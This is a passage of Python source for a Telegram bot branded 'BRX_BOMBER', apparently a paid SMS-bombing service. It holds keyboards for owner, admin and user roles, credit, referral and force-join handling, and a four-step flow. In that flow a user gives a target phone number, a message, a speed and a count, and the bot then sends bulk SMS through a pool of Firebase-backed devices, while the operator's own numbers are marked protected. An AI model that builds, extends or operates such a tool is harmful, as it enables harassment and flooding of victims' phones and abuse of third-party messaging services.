        [btn("📜 ACTIVITY", "owner:activity"), btn("💳 PRICING", "owner:pricing:menu")],
        [btn("🎁 REDEEM", "owner:redeem:menu"), btn("💰 CREDITS", "owner:credits:add")],
        [btn("🔒 PROTECT", "owner:protect"), btn("📍 TRACK", "owner:track")],
        [btn("🔗 FORCE JOIN", "owner:fj:menu"), btn("⚙️ SETTINGS", "owner:settings")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("📋 HISTORY", "owner:sms_history")],
        [btn("🔄 REFRESH", "owner:refresh")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 SEND", "admin:send"), btn("📹 VIDEOS", "owner:videos:menu")],
        [btn("👥 USERS", "admin:users:list"), btn("📊 STATS", "admin:stats")],
        [btn("🚫 BAN", "admin:ban"), btn("🔓 UNBAN", "admin:unban:menu")],
        [btn("📢 BROADCAST", "admin:broadcast")],
        [btn("🔄 REFRESH", "admin:refresh")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("⚡ SEND", "user:send")],
        [btn("📹 VIDEOS", "user:random_video"), btn("💳 CREDITS", "user:credits")],
        [btn("🎁 REDEEM", "user:redeem"), btn("👥 REFER", "user:refer")],
        [btn("📊 STATS", "user:stats"), btn("📜 HISTORY", "user:sms_history")],
        [btn("💰 BUY CREDITS", "user:pricing")],
        [btn("💸 TRANSFER", "user:transfer"), btn("ℹ️ INFO", "user:info")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        vid_label = f"Video #{idx}"
        rows.append([btn(vid_label, "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in fbs:
        label = fb.get("label", fb["url"][:28])
        rows.append([
            btn(label[:28], "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}", EMOJI_CROSS, "🗑")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

def premium_private_text() -> str:
    return (
        "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "┃  🔐 <b>𝑮𝑹𝑶𝑼𝑷 𝑶𝑵𝑳𝒀 𝑴𝑶𝑫𝑬</b>\n"
        "┃\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        "┃\n"
        "┃  🚫 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝒄𝒉𝒂𝒕 𝒎𝒆𝒊𝒏 𝒏𝒐𝒓𝒎𝒂𝒍\n"
        "┃     𝒖𝒔𝒆𝒓 𝒂𝒄𝒄𝒆𝒔𝒔 𝒅𝒊𝒔𝒂𝒃𝒍𝒆𝒅 𝒉𝒂𝒊.\n"
        "┃\n"
        "┃  ⚡ 𝑩𝒐𝒕 𝒌𝒐 𝒂𝒏𝒚 𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝒈𝒓𝒐𝒖𝒑 /\n"
        "┃     𝒔𝒖𝒑𝒆𝒓𝒈𝒓𝒐𝒖𝒑 𝒎𝒆𝒊𝒏 𝒖𝒔𝒆 𝒌𝒂𝒓𝒆𝒊𝒏.\n"
        "┃\n"
        "┃  👑 𝑶𝒘𝒏𝒆𝒓 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒎𝒆𝒊𝒏 𝒃𝒉𝒊 𝒂𝒄𝒄𝒆𝒔𝒔\n"
        "┃     𝒖𝒔𝒆 𝒌𝒂𝒓 𝒔𝒂𝒌𝒕𝒂 𝒉𝒂𝒊.\n"
        "┃\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

def premium_private_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn_url("🚀 𝑱𝑶𝑰𝑵 𝑩𝑹X𝑶𝑻𝑬𝑨𝑴", OFFICIAL_GROUP_LINK, EMOJI_ROCKET, "🚀")],
        [btn("ℹ️ 𝑰𝑵𝑭𝑶", "user:info", EMOJI_GEAR, "ℹ️")]
    ])

class PrivateAccessMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = getattr(event, "from_user", None)
        if not user:
            return await handler(event, data)

        if user.id == MAIN_OWNER:
            return await handler(event, data)

        message = getattr(event, "message", None)
        chat = getattr(message, "chat", None) if message else getattr(event, "chat", None)
        if chat is None and hasattr(event, "chat"):
            chat = event.chat

        if chat and getattr(chat, "type", None) == "private":
            if isinstance(event, CallbackQuery):
                try:
                    await event.answer("🔐 𝑮𝒓𝒐𝒖𝒑 𝒐𝒏𝒍𝒚 𝒂𝒄𝒄𝒆𝒔𝒔", show_alert=True)
                except Exception:
                    pass
                return

            try:
                await event.answer(
                    premium_private_text(),
                    reply_markup=premium_private_kb(),
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                )
            except Exception as exc:
                log.warning("Private access reply failed: %s", exc)
            return

        return await handler(event, data)

R.message.outer_middleware(PrivateAccessMiddleware())
R.callback_query.outer_middleware(PrivateAccessMiddleware())

async def send_premium_group_welcome(bot: Bot, chat_id: int, user) -> None:
    name = user.full_name or user.first_name or "New Member"
    uname = f"@{user.username}" if user.username else f"ID {user.id}"
    text = (
        "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "┃  ✨ <b>𝑵𝑬𝑾 𝑴𝑬𝑴𝑩𝑬𝑹 𝑨𝑳𝑬𝑹𝑻</b>\n"
        "┃\n"
        f"┃  👋 <b>𝑾𝒆𝒍𝒄𝒐𝒎𝒆, {esc_html(name)}</b>\n"
        f"┃  🔗 {esc_html(uname)}\n"
        f"┃  🆔 <code>{user.id}</code>\n"
        "┃\n"
        f"┃  💎 <b>{BOT_DISPLAY_NAME}</b>\n"
        "┃  ⚡ 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑮𝒓𝒐𝒖𝒑 𝑴𝒐𝒅𝒆\n"
        "┃  🛡️ 𝑺𝒎𝒂𝒓𝒕 𝑨𝒄𝒄𝒆𝒔𝒔\n"
        "┃\n"
        "┃  🎯 <i>𝑪𝒐𝒎𝒎𝒂𝒏𝒅: /start</i>\n"
        f"┃  👑 𝑶𝒘𝒏𝒆𝒓: {SUPER_ADMIN_NAME}\n"
        "┃\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )
    await bot.send_message(
        chat_id,
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("⚡ 𝑶𝑷𝑬𝑵 𝑴𝑬𝑵𝑼", "user:home", EMOJI_ROCKET, "⚡")]
        ]),
        parse_mode="HTML",
    )

def esc_html(value: str) -> str:
    return str(value).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

@R.chat_member()
async def group_new_member_welcome(event: ChatMemberUpdated, bot: Bot):
    if event.chat.type not in ("group", "supergroup"):
        return

    old_status = getattr(event.old_chat_member, "status", "")
    new_status = getattr(event.new_chat_member, "status", "")
    old_status = getattr(old_status, "value", old_status)
    new_status = getattr(new_status, "value", new_status)

    if new_status not in {"member", "administrator", "creator"}:
        return
    if old_status not in {"left", "kicked"}:
        return

    try:
        await send_premium_group_welcome(bot, event.chat.id, event.new_chat_member.user)
    except Exception as exc:
        log.warning("Group welcome failed: %s", exc)

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass
        save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await msg.answer(
        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"┃  🚀 <b>{BOT_DISPLAY_NAME}</b>\n"
        f"┃  ✦ 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑮𝒓𝒐𝒖𝒑 𝑴𝒐𝒅𝒆\n"
        f"┃  👋 𝑾𝒆𝒍𝒄𝒐𝒎𝒆, <b>{esc_html(name)}</b>\n"
        f"┃  ⚡ 𝑹𝒆𝒂𝒅𝒚 𝒇𝒐𝒓 𝒂𝒄𝒕𝒊𝒐𝒏.\n"
        f"┃  👑 𝑶𝒘𝒏𝒆𝒓: {SUPER_ADMIN_NAME}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="HTML"
    )

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Brijesh_21.t.me ", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await msg.answer(
        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"┃  🚀 <b>{BOT_DISPLAY_NAME}</b>\n"
        f"┃  ✦ 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑮𝒓𝒐𝒖𝒑 𝑴𝒐𝒅𝒆\n"
        f"┃  👋 𝑾𝒆𝒍𝒄𝒐𝒎𝒆, <b>{esc_html(name)}</b>\n"
        f"┃  ⚡ 𝑹𝒆𝒂𝒅𝒚 𝒇𝒐𝒓 𝒂𝒄𝒕𝒊𝒐𝒏.\n"
        f"┃  👑 𝑶𝒘𝒏𝒆𝒓: {SUPER_ADMIN_NAME}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="HTML"
    )

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return

    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer("⚡ 𝑺𝒑𝒆𝒆𝒅 𝒍𝒐𝒄𝒌𝒆𝒅 ✓")
    except Exception:
        pass
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_DEFAULT)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    count = len(get_cached_devices())
    uid = cq.from_user.id
    d = load()
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b>"
    text = (
        f"╔══════════════════════╗\n"
        f"  🛰️ <b>{BOT_DISPLAY_NAME}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_CHECK, '✅')} <b>STEP 3 COMPLETE</b>\n"
        f"{em(EMOJI_ROCKET, '⚡')} Speed: <b>{speed_label}</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Cached Online APIs: <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Available Capacity: <b>{count * 3}</b> SMS"
        f"{credit_info}\n\n"
        f"⌨️ <b>Kitne SMS bhejna hai?</b>\n"
        f"<i>Enter a number below to continue.</i>"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")
    except Exception as e:
        log.warning(f"User speed UI update failed: {e}")
        try:
            await cq.message.answer(text, reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")
        except Exception:
            pass

@R.message(S.send_speed)
async def user_count_typed_at_speed(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    if not raw.isdigit() or int(raw) < 1:
        await msg.answer(
            f"{em(EMOJI_ROCKET, '⚡')} <b>Speed select karo</b> ya directly valid SMS count bhejo.\n"
            f"Example: <code>10</code>", reply_markup=speed_kb("user"), parse_mode="HTML"
        )
        return
    await state.update_data(send_speed=SPEED_DEFAULT)
    await state.set_state(S.send_count)
    await user_got_count(msg, state)

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        probe = await msg.answer(
            f"{em(EMOJI_WARNING, '🔎')} <b>ONLINE NODES CHECKING...</b>\n<i>BRX_BOMBER is syncing available nodes. Please wait.</i>",
            parse_mode="HTML"
        )
        devices = await get_all_online_devices(d)
        try:
            await probe.delete()
        except Exception:
            pass

    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer("⚡ 𝑺𝒑𝒆𝒆𝒅 𝒍𝒐𝒄𝒌𝒆𝒅 ✓")
    except Exception:
        pass
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_DEFAULT)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)
    count = len(get_cached_devices())
    uid = cq.from_user.id
    d = load()
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b>"
    text = (
        f"╔══════════════════════╗\n"
        f"  👑 <b>{BOT_DISPLAY_NAME}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_CHECK, '✅')} <b>STEP 3 COMPLETE</b>\n"
        f"{em(EMOJI_ROCKET, '⚡')} Speed: <b>{speed_label}</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Cached Online APIs: <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Available Capacity: <b>{count * 3}</b> SMS"
        f"{credit_info}\n\n"
        f"⌨️ <b>Kitne SMS bhejna hai?</b>\n"
        f"<i>Enter a number below to continue.</i>"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
    except Exception as e:
        log.warning(f"Owner speed UI update failed: {e}")
        try:
            await cq.message.answer(text, reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
        except Exception:
            pass

@R.message(S.owner_send_speed)
async def owner_count_typed_at_speed(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    if not raw.isdigit() or int(raw) < 1:
